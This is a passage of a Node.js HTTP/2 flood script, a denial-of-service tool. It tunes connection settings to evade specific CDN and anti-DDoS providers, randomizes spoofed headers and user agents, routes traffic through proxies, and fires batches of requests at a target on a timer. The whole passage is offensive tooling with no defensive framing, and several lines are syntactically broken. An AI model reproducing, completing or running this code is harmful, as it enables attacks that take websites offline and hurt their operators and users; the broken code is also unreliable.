            ...(Math.random() < 0.5 ? {ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA'} : {}),
            // ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
            ecdhCurve: "x25519:secp256r1:secp384r1",
            secure: true,
            rejectUnauthorized: false,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            allowHalfOpen: true,
            highWaterMark: 16*2010,
            secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method', 'TLS_GREASE'],
            // session: crypto.randomBytes(16),
            // timeout: 2500,
        };
        function createCustomTLSSocket(port, parsedTarget, connection) {
            const tlsSocket = tls.connect({
                ...tlsOptions,
                host: parsedTarget.host,
                port: port,
                servername: parsedTarget.host,
                socket: connection
            });            
            return tlsSocket;
        };


        const tlsSocket = createCustomTLSSocket(443, parsedTarget, connection);

        // tlsSocket.setKeepAlive(true, 600000 * 1000);  
        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsSocket,
             settings: getSettingsBasedOnISP(isp),
             maxDeflateDynamicTableSize: 4294967295,
             maxSettings: 4294967295,
             maxSessionMemory: 4294967295,
             maxHeaderListPairs: 4294967295,
             maxOutstandingPings: 4294967295,
             maxReservedRemoteStreams: 4294967295,
             maxSendHeaderBlockLength: 4294967295,
             peerMaxConcurrentStreams: 4294967295,
             socket: connection,
		},(session) => {
			session.setLocalWindowSize(15663105);
		});

        function getSettingsBasedOnISP(isp) {
            const settings = {
              headerTableSize: 65536,
              initialWindowSize: 6291456,
              maxHeaderListSize: 262144,
              enablePush: false,
            };
            
            if (isp === 'Cloudflare, Inc.') {
            
              settings.maxConcurrentStreams = 100;

              settings.initialWindowSize = 65536;

              settings.maxFrameSize = 16384;
              
              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;


            } else if (isp === 'FDCservers.net' || isp === 'OVH SAS' || isp == 'VNXCLOUD') {

              settings.headerTableSize = 4096;
              
              settings.initialWindowSize = 65536;

              settings.maxFrameSize = 16777215;

              settings.maxConcurrentStreams = 128;

              settings.maxHeaderListSize = 4294967295;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;
              
            } else if (isp === 'Akamai Technologies, Inc.' || isp === 'Akamai International B.V.') {
              
              settings.headerTableSize = 4096;

              settings.maxConcurrentStreams = 100;

              settings.initialWindowSize = 6291456;

              settings.maxFrameSize = 16384;

              settings.maxHeaderListSize = 32768;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;
            
            } else if (isp === 'Fastly, Inc.' || isp === 'Optitrust GmbH') {

              settings.headerTableSize = 4096;

              settings.enablePush = false;

              settings.initialWindowSize = 65535;

              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 4294967295;

              settings.enableConnectProtocol = false;
              
            } else if (isp === 'Ddos-guard LTD') {

              settings.maxHeaderListSize = 262144;

              settings.maxConcurrentStreams = 8;

              settings.initialWindowSize = 65535;

              settings.maxFrameSize = 16777215;
              
              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

            } else if (isp === 'Amazon.com, Inc.' || isp === 'Amazon Technologies Inc.') {
              
              settings.maxHeaderListSize = 262144;

              settings.maxConcurrentStreams = 100;

              settings.initialWindowSize = 65535;

              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            } else if (isp === 'Microsoft Corporation' || isp === 'Vietnam Posts and Telecommunications Group' || isp === 'VIETNIX') {

              settings.headerTableSize = 4096;

              settings.enablePush = false;

              settings.initialWindowSize = 8388608;

              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 4294967295;

              settings.enableConnectProtocol = false;
              
            
            } else if (isp === 'Google LLC') {
              
              settings.headerTableSize = 4096;

              settings.initialWindowSize = 1048576;
              
              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 137216;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            } else {

              settings.headerTableSize = 65535;

              settings.maxConcurrentStreams = 1000;

              settings.initialWindowSize = 6291456;

              settings.maxHeaderListSize = 261144;

              settings.maxFrameSize = 16384;
              
              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            }
          
            return settings;
          
         };
        //  console.log(getSettingsBasedOnISP(isp))
         client.on("connect", () => {
            const choose_method = process.argv[7]
            if (choose_method === "GET") {
                const nm = [
                    "110.0.0.0",
                    "111.0.0.0",
                    "112.0.0.0",
                    "113.0.0.0",
                    "114.0.0.0",
                    "115.0.0.0",
                    "116.0.0.0",
                    "117.0.0.0",
                    "118.0.0.0",
                    "119.0.0.0",
                    ];
                    const nmx = [
                    "120.0",
                    "119.0",
                    "118.0",
                    "117.0",
                    "116.0",
                    "115.0",
                    "114.0",
                    "113.0",
                    "112.0",
                    "111.0",
                    ];
                    const nmx1 = [
                    "105.0.0.0",
                    "104.0.0.0",
                    "103.0.0.0",
                    "102.0.0.0",
                    "101.0.0.0",
                    "100.0.0.0",
                    "99.0.0.0",
                    "98.0.0.0",
                    "97.0.0.0",
                    ];
                    const sysos = [
                    "Macintosh",
                    "Windows 1.01",
                    "Windows 1.02",
                    "Windows 1.03",
                    "Windows 1.04",
                    "Windows 2.01",
                    "Windows 3.0",
                    "Windows NT 3.1",
                    "Windows NT 3.5",
                    "Windows 95",
                    "Windows 98",
                    "Windows 2006",
                    "Windows NT 4.0",
                    "Windows 95 Edition",
                    "Windows 98 Edition",
                    "Windows Me",
                    "Windows Business",
                    "Windows XP",
                    "Windows 7",
                    "Windows 8",
                    "Windows 10 version 1507",
                    "Windows 10 version 1511",
                    "Windows 10 version 1607",
                    "Windows 10 version 1703",
                    ];
                    const winarch = [
                    "rv:40.0",
                    "rv:41.0",
                    "x86-16",
                    "x86-16, IA32",
                    "IA-32",
                    "IA-32, Alpha, MIPS",
                    "IA-32, Alpha, MIPS, PowerPC",
                    "Itanium",
                    "x86_64",
                    "IA-32, x86-64",
                    "IA-32, x86-64, ARM64",
                    "x86-64, ARM64",
                    "ARMv4, MIPS, SH-3",
                    "ARMv4",
                    "ARMv5",
                    "ARMv7",
                    "IA-32, x86-64, Itanium",
                    "IA-32, x86-64, Itanium",
                    "x86-64, Itanium",
                    ];
                    const winch = [
                    "Intel Mac OS X 10.9",
                    "Intel Mac OS X 10.7",
                    "Intel Mac OS X 10_10_3",
                    "Intel Mac OS X 10_10_1",
                    "Intel Mac OS X 10_10_4",
                    "2012 R2",
                    "2019 R2",
                    "2012 R2 Datacenter",
                    "Server Blue",
                    "Longhorn Server",
                    "Whistler Server",
                    "Shell Release",
                    "Daytona",
                    "Razzle",
                    "HPC 2008",
                    ];
                    const rd = [
                      "002205d0f96c37c5e660b9f041363c1",
                      "073eede15b2a5a0302d823ecbd5ad15b",
                      "0b61c673ee71fe9ee725bd687c455809",
                      "6cd1b944f5885e2cfbe98a840b75eeb8",
                      "94c485bca29d5392be53f2b8cf7f4304",
                      "b4f4e6164f938870486578536fc1ffce",
                      "b8f81673c0e1d29908346f3bab892b9b",
                      "baaac9b6bf25ad098115c71c59d29e51",
                      "bc6c386f480ee97b9d9e52d472b772d8",
                      "da949afd9bd6df820730f8f171584a71",
                      "f58966d34ff9488a83797b55c804724d",
                      "fd6314b03413399e4f23d1524d206692",
                      "0a81538cf247c104edb677bdb8902ed5",
                      "0b6592fd91d4843c823b75e49b43838d",
                      "0ffee3ba8e615ad22535e7f771690a28",
                      "1c15aca4a38bad90f9c40678f6aface9",
                      "5163bc7c08f57077bc652ec370459c2f",
                      "a88f1426c4603f2a8cd8bb41e875cb75",
                      "b03910cc6de801d2fcfa0c3b9f397df4",
                      "bfcc1a3891601edb4f137ab7ab25b840",
                      "ce694315cbb81ce95e6ae4ae8cbafde6",
                      "f15797a734d0b4f171a86fd35c9a5e43",
                    ];
            
                     var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
                     var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
                     var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
                     var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
                     var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
                     var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
                     var villain = rd[Math.floor(Math.floor(Math.random() * rd.length))];
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": "GET",
                    ":scheme": "https",
                    ":path": buildPathWithQuery(parsedTarget, useQuery),
                    'content-disposition': 'inline;prerender',
                    "sec-purpose": "prefetch;prerender",
                    "sec-ch-ua-mobile": '?0',
                    "sec-ch-ua-platform": platform,
                    "user-agent": generateRandomString(3,8)  + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + villain +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
                    "upgrade-insecure-requests": "1",
                    ...(Math.random() < 0.5 ? {"sec-fetch-site": "none"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fetch-mode": "navigate"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fetch-user": "?1"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fetch-dest": "document": {}}),
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": lang,
                };
            };
            if (choose_method === "POSTDATA") {
                const nckx = parsedTarget.path.replace(/%RAND%/g, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
                headers = {
                    ":authority": parsedTarget.host,
                    "method": 'GET',
                    "scheme": "https",
                    "path": nckx,
                    "cache-control": 'no-cache',
                    ...fakeHeaders.shuffle(),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "origin": new URL(referer).origin,
                    "referer": referer,
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": randomUpperCaseString,
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
                };
            };
            if (choose_method === "POST") {
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": "POST",
                    ":scheme": "https",
                    ":path": parsedTarget.path + '?' + generateRandomString(4, 5) + '=' + generateRandomString(7, 9),
                    ...fakeHeaders.shuffle(),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "cache-control": control_header[Math.floor(Math.random() * control_header.length)],
                    "origin": new URL(referer).origin,
                    "referer": referer,
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": getUserAgent(),
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
               };
            };
            if (choose_method === "FLOOD") {
                let specificRequest = {};
                const specificMode = Math.floor(Math.random() * methods.length);
                const randomreqmode = methods[specificMode];
                let data = 'Client Hello'
                if(randomreqmode == 'POST') {
                    specificRequest = {
                        "content-type": "application/x-www-form-urlencoded",
                        ...(Math.random() < 0.5 ? {"content-length": '0'} : {"content-length": Buffer.byteLength(data)})
                    };
                }
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": randomreqmode,
                    ":scheme": "https",
                    ":path": randomreqmode === "POST" ? parsedTarget.path + '?' + generateRandomString(5, 6) + '=' + generateRandomString(10, 12) : path(parsedTarget.path, '[rand]', 8),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "cache-control": control_header[Math.floor(Math.random() * control_header.length)],
                    ...specificRequest,
                    "origin": new URL(referer).origin,
                    ...(Math.random() < 0.5 && {"referer": `https://${parsedTarget.host}.com/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`}),
                    ...fakeHeaders.shuffle(),
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": randomreqmode === "POST" ? getUserAgent() : randomUpperCaseString,
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
                    };
                };    
			      const CustomNCKheaders = {
			        ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    ...rd1[Math.floor(Math.random() * rd.length)],
                    ...rd[Math.floor(Math.random() * rd1.length)],
                    // ...mayberateHeaders,
			      };
                  const sendRequests = async (client, headers, reqSettings, numberOfRequests) => {
                    const requests = [];
                    for (let i = 0; i < numberOfRequests; i++) {
                        requests.push(
                            new Promise((resolve, reject) => {
                                const req = client.request(headers, reqSettings);
                                req.on('response', (response) => {  
                                    req.close();
                                    req.destroy();
                                });
                                req.setEncoding('utf8');
                                let data = '';
                                req.on('data', (chunk) => {
                                    data += chunk;
                                });
                                req.on('end', () => {
                                    requests.destroy();
                                    requests.end();
                                });
                                req.on('error', (error) => {
                                    reject(error);
                                    requests.destroy();
                                });
                                req.end();

                                client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
                            })
                        );
                    }
                    try {
                        await Promise.all(requests).then().finally(() => {
                          client.close(http2.constants.NGHTTP2_CANCEL);
                      });
                    } catch (error) {
                        return error
                    }
                };
            
            setInterval(async () => {
                    await sendRequests(client, CustomNCKheaders, reqSettings, args.Rate);
                }, 2000);
            });

            let options = shuffle({
                ...headers,
                ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                ...rd1[Math.floor(Math.random() * rd1.length)],
                ...rd[Math.floor(Math.random() * rd.length)],
            });
            const createHttpAgent = () => {
                return new http.Agent({
                    host: parsedProxy[0],
                    port: +parsedProxy[1]
                    , keepAlive: true
                    , keepAliveMsecs: 500000000
                    , maxSockets: 50000
                    , maxTotalSockets: 100000
                });
            };
    
            const createRequest = (client, options, reqSettings, priority) => {
                return new Promise((resolve, reject) => {
                    const httpAgent = createHttpAgent();
                    const Optionsreq = {    
                        agent: httpAgent,
                        method: 'CONNECT',
                        path: parsedTarget.host + ':443',
                        timeout: 1000,
                        headers: {
                            'Host': parsedTarget.host
                            , 'Proxy-Connection': 'Keep-Alive'
                            , 'Connection': 'Keep-Alive'
                        }
                    };
			        
                    const request = client.request({ ...options, Optionsreq }, reqSettings);
                    
                    const interval = setInterval(() => {
                        request.end();
                    }, 2000);

                    request.priority({
                        weight: priority.weight,
                        depends_on: priority.depends_on,
                        exclusive: priority.exclusive
                    });
                    
                    request.on('error', (error) => {
                        clearInterval(interval);
                        request.destroy();
                        reject(error);
                    });
                    
                    request.on('close', () => {
                        clearInterval(interval);
                        request.destroy();
                        request.end();
                    });
                    
                    request.on('timeout', () => {
                        clearInterval(interval);
                        request.destroy();
                        reject(new Error('Request timed out'));
                    });
                    
                    request.end();
                });
            };

            const ratedHeaders = [
                { 'CF-Visitor': '{"scheme":"https"}' },
                { 'CDN-Loop': 'cloudflare' },
                { 'CF-RAY': hash.substring(0, 16) + '-HKG' },
                { 'CF-Worker': parsedTarget.host },
                { 'CF-IPCountry': 'US' },
                { 'dnt': '1' },
                { 'x-forwarded-port': '443' },
                { 'x-forwarded-protocol': 'https' },
                { 'pragma': 'no-cache' },
                { 'via': randList(viaValues) },
                { 'priority': 'u=0, i' },
             ];
            const randomRateHeaders = [];
                while (randomRateHeaders.length < 3) {
                    const randomIndex = Math.floor(Math.random() * ratedHeaders.length);
                    const randomHeader = ratedHeaders[randomIndex];
                    if (!randomRateHeaders.some(header => JSON.stringify(header) === JSON.stringify(randomHeader))) {
                        randomRateHeaders.push(randomHeader);
                    }
                }
                let randomHeader = await shuffle({
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    ...(Math.random() < 0.5 ? {'referer': referer} : {}),
                    'Origin': new URL(referer).origin
                    ...(Math.random() < 0.5 ? {'x-requested-with': 'XMLHttpRequest'} : {}),
                });
                
            let oo = {
                [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + '?'+ 'data'+ generateRandomString(0,10)+ '=' + generateRandomString(10,20),
                [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                [http2.constants.HTTP2_HEADER_USER_AGENT]: randomUpperCaseString,
                [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
                [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: encoding,
                [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: 'no-cache',
                ...randomHeader,
                ...randomRateHeaders[0],
                ...randomRateHeaders[1],
                ...randomRateHeaders[2],
            };

            const agentoh = createHttpAgent()
            const request = client.request({...oo, ...agentoh}, reqSettings)
            const reques = client.request({...oo, ...agentoh}, reqSettings)
            const reque= client.request({...oo, ...agentoh}, reqSettings)
            request.end(http2.constants.NGHTTP2_REFUSED_STREAM);
            reques.end(http2.constants.NGHTTP2_REFUSED_STREAM);
            reque.end(http2.constants.NGHTTP2_REFUSED_STREAM);

            let dynHeaders = await shuffle({
                "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7" : 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                "sec-fetch-dest": 'document',
                ...(Math.random() < 0.5 ?{['custom-c-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} :{}),
	            ...(Math.random() < 0.5 ? { "x-build-id" : generateRandomString(35,35)} : {['x-content-type-options']: 'nosniff'}),
	            "if-modified-since": getRandomDate().toUTCString(),
                "date": getRandomDate().toUTCString()
            });

            let data = {
                ...headers,
                ...dynHeaders,
                'cookie': Math.random() < 0.5 ? referer : hash.substring(16, 24) + '=' + hash.substring(24, 32),
            };
            const nhieu = Math.random() < 0.5 ? data : options;
            const request1 = client.request(nhieu, reqSettings)
            const request2 = client.request(nhieu, reqSettings)
            const request3 = client.request(nhieu, reqSettings)
            request1.end();
            request2.end();
            request3.end();
            
            
            client.on("close", () => {
                client.destroy();
                tlsSocket.destroy();
                tlsSocket.end();
                connection.destroy();
                return
            });
            client.on("timeout", () => {
              client.destroy();
              tlsSocket.destroy();
              connection.destroy();
              return
            });
            client.on("error", () => {
              client.end();
	          client.close()
              tlsSocket.end();
              connection.end();
              return
            })

     }),function (error, response, body) {
		};
 }
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
